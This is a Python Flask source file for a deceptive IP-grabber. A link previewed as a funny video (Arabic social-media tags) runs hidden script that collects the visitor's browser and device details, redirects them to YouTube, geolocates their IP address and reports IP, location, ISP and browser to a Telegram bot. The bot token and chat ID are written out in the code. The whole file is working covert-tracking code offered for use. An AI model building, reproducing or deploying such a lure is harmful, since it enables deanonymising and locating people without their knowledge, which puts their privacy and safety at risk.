from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

BOT_TOKEN = "8972111633:AAFyA1hbPsVzMwM1ZzduSCnufgtOwWJ6b9g"
CHAT_ID = "@amoonah28"

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Watch Video</title>
    <meta property="og:title" content="مقطع ضحك مو طبيعي 😂" />
    <meta property="og:description" content="اضغط للمشاهدة" />
    <style>
        body { background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .btn { background: #ff0000; color: white; padding: 15px 30px; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px;}
    </style>
</head>
<body>
    <h2>جاري تحميل الفيديو...</h2>
    <script>
        fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                ua: navigator.userAgent,
                platform: navigator.platform,
                screen: window.screen.width + 'x' + window.screen.height,
                lang: navigator.language
            })
        });
        setTimeout(function() {
            window.location.href = "https://www.youtube.com";
        }, 1000);
    </script>
</body>
</html>
"""

def send_telegram_alert(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=3)
    except:
        pass

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/collect', methods=['POST'])
def collect():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = request.json or {}
    try:
        geo = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3).json()
    except:
        geo = {}

    msg = (
        f"🚨 **دخل شخص جديد!**\n\n"
        f"🌐 **الآيب:** `{ip}`\n"
        f"📍 **الموقع:** {geo.get('city', 'Unknown')}, {geo.get('country', 'Unknown')}\n"
        f"🏢 **مزود الخدمة:** {geo.get('org', 'Unknown')}\n"
        f"💻 **النظام:** {data.get('platform')}\n"
        f"📱 **المتصفح:** `{data.get('ua')}`"
    )
    send_telegram_alert(msg)
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
